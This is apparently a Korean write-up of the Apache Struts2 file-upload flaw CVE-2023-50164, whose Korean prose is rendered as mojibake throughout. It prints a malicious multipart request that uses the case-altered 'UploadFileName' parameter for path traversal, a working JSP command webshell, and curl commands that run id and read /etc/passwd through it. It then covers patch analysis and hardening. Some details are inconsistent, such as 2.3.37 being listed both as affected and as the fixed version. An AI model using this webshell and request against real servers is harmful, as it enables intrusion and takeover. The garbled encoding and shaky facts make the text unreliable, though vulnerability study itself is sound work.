## ğŸŒ Apache Struts2 RCE ì·¨ì•½ì  (CVE-2023-50164)

### Apache Struts2ë€?

**Apache Struts2**ëŠ” Java EE ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ê°œë°œì„ ìœ„í•œ ì˜¤í”ˆì†ŒìŠ¤ MVC í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤. 2023ë…„ ê¸°ì¤€ ì „ ì„¸ê³„ ì•½ **358ë§Œ ê°œ** ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ë˜ê³  ìˆìœ¼ë©°, ì—”í„°í”„ë¼ì´ì¦ˆê¸‰ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ í•µì‹¬ í”„ë ˆì„ì›Œí¬ë¡œ ìë¦¬ì¡ê³  ìˆìŠµë‹ˆë‹¤.

### ì·¨ì•½ì  ìš”ì•½

**CVE-2023-50164**ëŠ” Apache Struts2ì˜ **íŒŒì¼ ì—…ë¡œë“œ ë¡œì§ ê²°í•¨**ìœ¼ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” **ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)** ì·¨ì•½ì ì…ë‹ˆë‹¤. íŒŒì¼ ì—…ë¡œë“œ ì‹œ **uploadFileName íŒŒë¼ë¯¸í„°ì˜ ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì˜¤ë¥˜**ë¥¼ ì•…ìš©í•˜ì—¬ ê³µê²©ìëŠ” ì¸ì¦ ì—†ì´ ì„œë²„ì— ì›¹ì…¸ì„ ì—…ë¡œë“œí•˜ê³  ì™„ì „í•œ ì‹œìŠ¤í…œ ì œì–´ê¶Œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì·¨ì•½ì  ì •ë³´

| í•­ëª© | ë‚´ìš© |
|------|------|
| **CVSS ì ìˆ˜** | 9.8 (Critical) |
| **ì·¨ì•½ì  ìœ í˜•** | íŒŒì¼ ì—…ë¡œë“œ ìš°íšŒ + ê²½ë¡œ ì¡°ì‘ (Path Traversal) + RCE |
| **ì˜í–¥ ë²„ì „** | Struts 2.0.0 - 2.3.37<br/>Struts 2.5.0 - 2.5.32<br/>Struts 6.0.0 - 6.3.0.1 |
| **ê³µê²© ë‚œì´ë„** | Low (ì¸ì¦ ë¶ˆí•„ìš”) |
| **ê³µê°œì¼** | 2023ë…„ 12ì›” 7ì¼ |
| **ì˜í–¥ ë²”ìœ„** | ì „ ì„¸ê³„ ì•½ 358ë§Œ ê°œ ì‚¬ì´íŠ¸ |

---

## ğŸ§  í•µì‹¬ ì›ì¸: íŒŒë¼ë¯¸í„° ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì˜¤ë¥˜

ì´ ì·¨ì•½ì ì˜ í•µì‹¬ì€ **íŒŒì¼ ì—…ë¡œë“œ íŒŒë¼ë¯¸í„°ì˜ ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì˜¤ë¥˜**ì…ë‹ˆë‹¤. Struts2ëŠ” íŒŒì¼ ì—…ë¡œë“œ ì‹œ `upload.uploadFileName` (ì†Œë¬¸ì F) íŒŒë¼ë¯¸í„°ë¥¼ ê²€ì¦í•˜ì§€ë§Œ, ê³µê²©ìê°€ `upload.UploadFileName` (ëŒ€ë¬¸ì F)ì„ ì‚¬ìš©í•˜ë©´ ê²€ì¦ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³µê²© ì›ë¦¬

**í•µì‹¬ ì°¨ì´ì :**
- âœ… `upload.uploadFileName` (ì†Œë¬¸ì F) â†’ ê²½ë¡œ ê²€ì¦ ìˆ˜í–‰ (ì •ìƒ)
- âŒ `upload.UploadFileName` (ëŒ€ë¬¸ì F) â†’ **ê²€ì¦ ìš°íšŒ** (ì·¨ì•½ì  ì•…ìš©)

ê³µê²©ìëŠ” ëŒ€ë¬¸ì Fë¥¼ ì‚¬ìš©í•˜ì—¬ `../../webapps/ROOT/shell.jsp`ì™€ ê°™ì€ ê²½ë¡œ ì¡°ì‘ ë¬¸ìì—´ì„ ì‚½ì…í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ì›¹ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì— ì•…ì„± JSP ì›¹ì…¸ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.

<details>
<summary>ğŸ“‹ **Upload í´ë˜ìŠ¤ì˜ 3ê°€ì§€ ì†ì„± (ìƒì„¸)**</summary>

Struts2ì˜ íŒŒì¼ ì—…ë¡œë“œëŠ” ë‹¤ìŒ 3ê°€ì§€ ì†ì„±ì„ ì‚¬ìš©í•©ë‹ˆë‹¤:

```java
public class Upload {
    private File upload;                  // 1. ì—…ë¡œë“œëœ íŒŒì¼ ê°ì²´
    private String uploadFileName;        // 2. íŒŒì¼ëª… (ì†Œë¬¸ì F)
    private String uploadContentType;     // 3. Content-Type (MIME íƒ€ì…)
    
    // Getter/Setter ë©”ì„œë“œ
    public void setUploadFileName(String fileName) {
        this.uploadFileName = fileName;
    }
    
    public String getUploadFileName() {
        return this.uploadFileName;
    }
}
```

**ì†ì„± ì„¤ëª…:**
1. **upload**: ì—…ë¡œë“œëœ ì‹¤ì œ íŒŒì¼ ê°ì²´
2. **uploadFileName**: íŒŒì¼ëª…ì„ ì €ì¥í•˜ëŠ” ë¬¸ìì—´ (ê²€ì¦ ëŒ€ìƒ)
3. **uploadContentType**: íŒŒì¼ì˜ MIME íƒ€ì… (ì˜ˆ: `image/jpeg`, `application/pdf`)

</details>

<details>
<summary>ğŸ” **ì •ìƒ ìš”ì²­ vs ì•…ì˜ì  ìš”ì²­ ë¹„êµ**</summary>

### ì •ìƒ ìš”ì²­ (ê²€ì¦ í†µê³¼)

```http
POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="test.txt"

[íŒŒì¼ ë‚´ìš©]
------WebKitFormBoundary
Content-Disposition: form-data; name="upload.uploadFileName"

test.txt
------WebKitFormBoundary--
```

**ê²°ê³¼:** íŒŒì¼ëª… ê²€ì¦ ìˆ˜í–‰ â†’ `../` ë¬¸ì ì°¨ë‹¨ â†’ ì •ìƒ ì—…ë¡œë“œ

---

### ì•…ì˜ì  ìš”ì²­ (ê²€ì¦ ìš°íšŒ)

```http
POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="shell.jsp"

<%@ page import="java.io.*" %>
<% 
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
%>
------WebKitFormBoundary
Content-Disposition: form-data; name="upload.UploadFileName"

../../webapps/ROOT/shell.jsp
------WebKitFormBoundary--
```

**ê²°ê³¼:** íŒŒì¼ëª… ê²€ì¦ ìš°íšŒ (ëŒ€ë¬¸ì F) â†’ `../../` ê²½ë¡œ ì¡°ì‘ ì„±ê³µ â†’ ì›¹ì…¸ ì—…ë¡œë“œ âœ…

</details>

<details>
<summary>ğŸ” **ìƒì„¸ ë¶„ì„: ì™œ ëŒ€ì†Œë¬¸ì ë³€ê²½ìœ¼ë¡œ ìš°íšŒê°€ ê°€ëŠ¥í•œê°€?**</summary>

### íŒŒë¼ë¯¸í„° ë°”ì¸ë”© ë©”ì»¤ë‹ˆì¦˜

Struts2ëŠ” HTTP ìš”ì²­ íŒŒë¼ë¯¸í„°ë¥¼ ìë™ìœ¼ë¡œ Java ê°ì²´ì˜ ì†ì„±ì— ë°”ì¸ë”©í•©ë‹ˆë‹¤:

```java
// FileUploadInterceptor.java (íŒ¨ì¹˜ ì „)
public String intercept(ActionInvocation invocation) {
    HttpServletRequest request = ServletActionContext.getRequest();
    
    // íŒŒë¼ë¯¸í„° ì´ë¦„: upload.uploadFileName
    String paramName = "upload.uploadFileName";
    String fileName = request.getParameter(paramName);
    
    // ê²½ë¡œ ê²€ì¦ (../ í¬í•¨ ì—¬ë¶€ í™•ì¸)
    if (fileName != null && fileName.contains("../")) {
        return "error"; // ì°¨ë‹¨
    }
    
    // íŒŒì¼ ì €ì¥
    action.setUploadFileName(fileName);
}
```

**ë¬¸ì œì :**
- ê²€ì¦ ë¡œì§ì€ `upload.uploadFileName` (ì†Œë¬¸ì F)ë§Œ í™•ì¸
- `upload.UploadFileName` (ëŒ€ë¬¸ì F)ëŠ” **ê²€ì¦ì„ ê±°ì¹˜ì§€ ì•ŠìŒ**
- í•˜ì§€ë§Œ Struts2ì˜ ìë™ ë°”ì¸ë”©ì€ **ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠìŒ**
- ê²°ê³¼ì ìœ¼ë¡œ `upload.UploadFileName`ë„ `setUploadFileName()` ë©”ì„œë“œ í˜¸ì¶œ

### ê³µê²© íë¦„

```
1. ê³µê²©ì: upload.UploadFileName = "../../shell.jsp" ì „ì†¡
   â†“
2. FileUploadInterceptor: upload.uploadFileName ê²€ì¦ (í†µê³¼, ê°’ ì—†ìŒ)
   â†“
3. ParametersInterceptor: upload.UploadFileName ë°”ì¸ë”©
   â†“
4. setUploadFileName("../../shell.jsp") í˜¸ì¶œ
   â†“
5. íŒŒì¼ ì €ì¥: /var/lib/tomcat9/webapps/ROOT/shell.jsp
   â†“
6. ì›¹ì…¸ ì—…ë¡œë“œ ì™„ë£Œ âœ…
```

</details>

---

## ğŸ’¥ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ (ì›¹ì…¸ ì—…ë¡œë“œ ë° RCE)

ê³µê²©ìëŠ” ë‹¤ìŒ 4ë‹¨ê³„ë¥¼ í†µí•´ ì„œë²„ë¥¼ ì™„ì „íˆ ì¥ì•…í•©ë‹ˆë‹¤:

### ê³µê²© íë¦„

```
1. ì„œë²„ íƒìƒ‰
   â†“
2. ì•…ì„± íŒŒì¼ ì—…ë¡œë“œ (ëŒ€ì†Œë¬¸ì ìš°íšŒ)
   â†“
3. ì›¹ì…¸ ê²½ë¡œ í™•ì¸
   â†“
4. ì›ê²© ëª…ë ¹ ì‹¤í–‰ (RCE)
```

### Step 1: ì„œë²„ íƒìƒ‰

ê³µê²©ìëŠ” Apache Struts2ë¥¼ ì‚¬ìš©í•˜ëŠ” íŒŒì¼ ì—…ë¡œë“œ í˜ì´ì§€ë¥¼ íƒìƒ‰í•©ë‹ˆë‹¤.

**íƒì§€ ë°©ë²•:**
- Wappalyzer ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨
- HTTP í—¤ë” í™•ì¸ (`Server: Apache-Coyote/1.1`)
- ê²€ìƒ‰ ì—”ì§„ (Shodan, Censys)

### Step 2: ì•…ì„± íŒŒì¼ ì—…ë¡œë“œ

ëŒ€ì†Œë¬¸ìë¥¼ ì¡°ì‘í•œ íŒŒë¼ë¯¸í„° **`upload.UploadFileName`** (ëŒ€ë¬¸ì F)ë¥¼ ì‚¬ìš©í•˜ì—¬ ê²½ë¡œ ê²€ì¦ì„ ìš°íšŒí•˜ê³ , `../../` ê²½ë¡œ ì¡°ì‘ì„ í†µí•´ ì›¹ ë£¨íŠ¸ì— ì›¹ì…¸ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.

**ì—…ë¡œë“œ íŒŒì¼ (shell.jsp):**
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(
      new InputStreamReader(p.getInputStream())
    );
    String line;
    while ((line = br.readLine()) != null) {
      out.println(line + "<br>");
    }
  }
%>
```

### Step 3: ì›¹ì…¸ ê²½ë¡œ í™•ì¸

ì—…ë¡œë“œëœ ì›¹ì…¸ì˜ ê²½ë¡œë¥¼ í™•ì¸í•©ë‹ˆë‹¤.

**ì¼ë°˜ì ì¸ ê²½ë¡œ:**
- `http://target.com/shell.jsp`
- `http://target.com/ROOT/shell.jsp`
- `http://target.com/upload/shell.jsp`

### Step 4: ì›ê²© ëª…ë ¹ ì‹¤í–‰ (RCE)

ì›¹ì…¸ì— ì ‘ê·¼í•˜ì—¬ **root ê¶Œí•œ**ìœ¼ë¡œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

**ê³µê²© ì˜ˆì‹œ:**
```bash
# í˜„ì¬ ì‚¬ìš©ì í™•ì¸
curl "http://10.0.0.166:8080/shell.jsp?cmd=id"
# ê²°ê³¼: uid=0(root) gid=0(root) groups=0(root)

# ì‹œìŠ¤í…œ ì •ë³´ í™•ì¸
curl "http://10.0.0.166:8080/shell.jsp?cmd=uname+-a"

# ë¯¼ê° íŒŒì¼ ì ‘ê·¼
curl "http://10.0.0.166:8080/shell.jsp?cmd=cat+/etc/passwd"
```

**ê³µê²© ì„±ê³µ ì‹œ ì˜í–¥:**
- âœ… ì™„ì „í•œ ì‹œìŠ¤í…œ ì œì–´ê¶Œ íšë“ (root ê¶Œí•œ)
- âœ… ë°ì´í„°ë² ì´ìŠ¤ ì ‘ì† ì •ë³´ íƒˆì·¨
- âœ… ë¯¼ê° ë°ì´í„° ì™¸ë¶€ ìœ ì¶œ
- âœ… ëœì„¬ì›¨ì–´ ë˜ëŠ” ì•”í˜¸í™”í ì±„êµ´ê¸° ì„¤ì¹˜

---

## ğŸ›¡ï¸ ëŒ€ì‘ ë°©ì•ˆ ë° ì¶”ê°€ ë³´ì•ˆ ì¡°ì¹˜

### íŒ¨ì¹˜ ë²„ì „ ì—…ê·¸ë ˆì´ë“œ (ìµœìš°ì„ )

**ì¦‰ì‹œ ì—…ê·¸ë ˆì´ë“œ í•„ìˆ˜:**
- âœ… Apache Struts **6.3.0.2** ì´ìƒ
- âœ… Apache Struts **2.5.33** ì´ìƒ  
- âœ… Apache Struts **2.3.37** ì´ìƒ

**íŒ¨ì¹˜ í•µì‹¬:**
- `equalsIgnoreCase()` ë©”ì„œë“œ ì¶”ê°€ë¡œ ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ì´ íŒŒë¼ë¯¸í„° ê²€ì¦
- `remove()` ë©”ì„œë“œ ì¶”ê°€ë¡œ ì¤‘ë³µ íŒŒë¼ë¯¸í„° ì œê±°
- `../` ê²½ë¡œ ì¡°ì‘ ë¬¸ìì—´ ì°¨ë‹¨ ê°•í™”

<details>
<summary>ğŸ”§ **íŒ¨ì¹˜ ì½”ë“œ ìƒì„¸ ë¶„ì„ (ê¸°ìˆ ì  ìƒì„¸)**</summary>

### íŒ¨ì¹˜ ì „ (CVE-2023-50164 ì·¨ì•½)

```java
// HttpParameters.java (íŒ¨ì¹˜ ì „)
public class HttpParameters {
    private Map<String, Parameter> parameters = new HashMap<>();
    
    public Parameter get(String name) {
        return parameters.get(name); // ëŒ€ì†Œë¬¸ì êµ¬ë¶„ âœ…
    }
}
```

**ë¬¸ì œì :**
- `get("upload.uploadFileName")`ê³¼ `get("upload.UploadFileName")`ì´ **ë‹¤ë¥¸ ê°’** ë°˜í™˜
- ê²€ì¦ ë¡œì§ ìš°íšŒ ê°€ëŠ¥

---

### íŒ¨ì¹˜ í›„ (CVE-2023-50164 ìˆ˜ì •)

```java
// HttpParameters.java (íŒ¨ì¹˜ í›„)
public class HttpParameters {
    private Map<String, Parameter> parameters = new HashMap<>();
    
    // ğŸ”¥ ìƒˆë¡œ ì¶”ê°€ëœ ë©”ì„œë“œ
    public Parameter remove(String name) {
        // ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ì´ ì œê±°
        Iterator<Map.Entry<String, Parameter>> it = parameters.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry<String, Parameter> entry = it.next();
            if (entry.getKey().equalsIgnoreCase(name)) { // ğŸ”¥ equalsIgnoreCase ì‚¬ìš©
                Parameter param = entry.getValue();
                it.remove();
                return param;
            }
        }
        return null;
    }
    
    public Parameter get(String name) {
        // ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ì´ ì¡°íšŒ
        for (Map.Entry<String, Parameter> entry : parameters.entrySet()) {
            if (entry.getKey().equalsIgnoreCase(name)) { // ğŸ”¥ equalsIgnoreCase ì‚¬ìš©
                return entry.getValue();
            }
        }
        return null;
    }
}
```

**ê°œì„  ì‚¬í•­:**
1. **`remove()` ë©”ì„œë“œ ì¶”ê°€**: íŒŒë¼ë¯¸í„°ë¥¼ ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ì´ ì œê±°
2. **`equalsIgnoreCase()` ì‚¬ìš©**: ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ì´ ë¹„êµ
3. **ì¼ê´€ëœ ê²€ì¦**: `upload.uploadFileName`ê³¼ `upload.UploadFileName` ëª¨ë‘ ë™ì¼í•˜ê²Œ ì²˜ë¦¬

---

### íŒ¨ì¹˜ ì ìš© í›„ ê³µê²© ì‹œë„

```http
POST /upload.action HTTP/1.1
Content-Disposition: form-data; name="upload.UploadFileName"

../../shell.jsp
```

**ê²°ê³¼:**
```
HTTP/1.1 400 Bad Request

Error: Invalid file path detected
```

**ì°¨ë‹¨ ì´ìœ :**
- `equalsIgnoreCase()`ë¡œ ì¸í•´ `upload.UploadFileName`ë„ ê²€ì¦ ëŒ€ìƒì— í¬í•¨
- `../` ê²½ë¡œ ì¡°ì‘ íƒì§€ â†’ ìš”ì²­ ì°¨ë‹¨

</details>

<details>
<summary>ğŸ”’ **ì¶”ê°€ ë³´ì•ˆ ì¡°ì¹˜ (ë‹¤ì¸µ ë°©ì–´)**</summary>

#### 1. íŒŒì¼ ì—…ë¡œë“œ ë””ë ‰í† ë¦¬ ê¶Œí•œ ìµœì†Œí™”

```bash
# ì—…ë¡œë“œ ë””ë ‰í† ë¦¬ ì‹¤í–‰ ê¶Œí•œ ì œê±°
chmod 755 /var/lib/tomcat9/webapps/uploads
chmod 644 /var/lib/tomcat9/webapps/uploads/*

# ì‹¤í–‰ ê¶Œí•œ ì œê±° (noexec)
mount -o remount,noexec /var/lib/tomcat9/webapps/uploads
```

#### 2. WAF ê·œì¹™ ì¶”ê°€

```nginx
# Nginx WAF ê·œì¹™
location /upload.action {
    # ../ ê²½ë¡œ ì¡°ì‘ ì°¨ë‹¨
    if ($request_body ~* "\.\./") {
        return 403;
    }
    
    # .jsp, .jspx íŒŒì¼ ì—…ë¡œë“œ ì°¨ë‹¨
    if ($request_body ~* "\.jsp") {
        return 403;
    }
    
    proxy_pass http://backend;
}
```

#### 3. íŒŒì¼ëª… í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦

```java
// ì•ˆì „í•œ íŒŒì¼ ì—…ë¡œë“œ ê²€ì¦
public boolean isValidFileName(String fileName) {
    // í—ˆìš©ëœ í™•ì¥ìë§Œ í—ˆìš©
    String[] allowedExtensions = {".jpg", ".png", ".pdf", ".txt"};
    
    for (String ext : allowedExtensions) {
        if (fileName.toLowerCase().endsWith(ext)) {
            return true;
        }
    }
    
    return false;
}
```

</details>

---

## ğŸ’¡ í•™ìŠµ í¬ì¸íŠ¸

ì´ ì·¨ì•½ì ì„ í†µí•´ ë‹¤ìŒì˜ ì¤‘ìš”í•œ ë³´ì•ˆ ì›ì¹™ì„ ë°°ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

### 1. **ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì˜¤ë¥˜ì˜ ìœ„í—˜ì„±**

**í•µì‹¬:**
- `uploadFileName` (ì†Œë¬¸ì F) vs `UploadFileName` (ëŒ€ë¬¸ì F)ì˜ ë¯¸ë¬˜í•œ ì°¨ì´
- íŒŒë¼ë¯¸í„° ë°”ì¸ë”© ë©”ì»¤ë‹ˆì¦˜ì— ëŒ€í•œ ê¹Šì€ ì´í•´ í•„ìš”

**êµí›ˆ:**
- ì…ë ¥ ê²€ì¦ ì‹œ **ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ì´** ì²˜ë¦¬í•´ì•¼ í•¨
- `equalsIgnoreCase()` ê°™ì€ ë©”ì„œë“œ ì‚¬ìš© í•„ìˆ˜

---

### 2. **ê²½ë¡œ ê²€ì¦ ìš°íšŒ (Path Traversal)**

**í•µì‹¬:**
- `../../` ë¥¼ í†µí•œ ë””ë ‰í† ë¦¬ íƒìƒ‰ ê³µê²©
- ì—…ë¡œë“œ ë””ë ‰í† ë¦¬ ì™¸ë¶€ë¡œ íŒŒì¼ ì €ì¥ ê°€ëŠ¥

**êµí›ˆ:**
- ê²½ë¡œ ì •ê·œí™”(Normalization) í›„ ê²€ì¦ í•„ìš”
- ì ˆëŒ€ ê²½ë¡œ ì‚¬ìš© ë˜ëŠ” í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê¸°ë°˜ ê²€ì¦

---

### 3. **ë¶ˆì™„ì „í•œ íŒ¨ì¹˜ì˜ ìœ„í—˜ì„±**

**í•µì‹¬:**
- CVE-2023-50164 íŒ¨ì¹˜ í›„ì—ë„ CVE-2024-53677 ë°œìƒ
- ê·¼ë³¸ì ì¸ ì„¤ê³„ ê²°í•¨ í•´ê²° í•„ìš”

**êµí›ˆ:**
- íŒ¨ì¹˜ í›„ì—ë„ **ì§€ì†ì ì¸ ë³´ì•ˆ ê²€í† ** í•„ìš”
- ìœ ì‚¬í•œ ê³µê²© ë²¡í„° ì „ì²´ ì ê²€

---

### 4. **ë°©ì–´ ê¹Šì´ (Defense in Depth)**

**í•µì‹¬:**
- ë‹¨ì¼ ë³´ì•ˆ í†µì œì— ì˜ì¡´í•˜ë©´ ìœ„í—˜
- ì—¬ëŸ¬ ê³„ì¸µì˜ ë°©ì–´ ë©”ì»¤ë‹ˆì¦˜ í•„ìš”

**êµí›ˆ:**
- **ì…ë ¥ ê²€ì¦** (í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê¸°ë°˜)
- **ê²½ë¡œ ì •ê·œí™”** (../ ì œê±°)
- **ê¶Œí•œ ìµœì†Œí™”** (ì‹¤í–‰ ê¶Œí•œ ì œê±°)
- **WAF ì ìš©** (ì•…ì˜ì  íŒ¨í„´ ì°¨ë‹¨)

---

### ì·¨ì•½ì  ìš”ì•½í‘œ

| í•­ëª© | ë‚´ìš© |
|------|------|
| **ì·¨ì•½ì  ì›ì¸** | íŒŒì¼ ì—…ë¡œë“œ íŒŒë¼ë¯¸í„°ì˜ ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì˜¤ë¥˜ |
| **ê³µê²© ë°©ë²•** | `upload.UploadFileName` (ëŒ€ë¬¸ì F) ì‚¬ìš©ìœ¼ë¡œ ê²€ì¦ ìš°íšŒ |
| **ì˜í–¥** | ì„ì˜ ê²½ë¡œì— ì›¹ì…¸ ì—…ë¡œë“œ â†’ ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE) |
| **CVSS ì ìˆ˜** | 9.8 (Critical) |
| **íŒ¨ì¹˜ ë°©ë²•** | Struts 6.3.0.2 ì´ìƒìœ¼ë¡œ ì—…ê·¸ë ˆì´ë“œ |
| **í•µì‹¬ êµí›ˆ** | ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ëŠ” ê²€ì¦ + ë‹¤ì¸µ ë°©ì–´ |

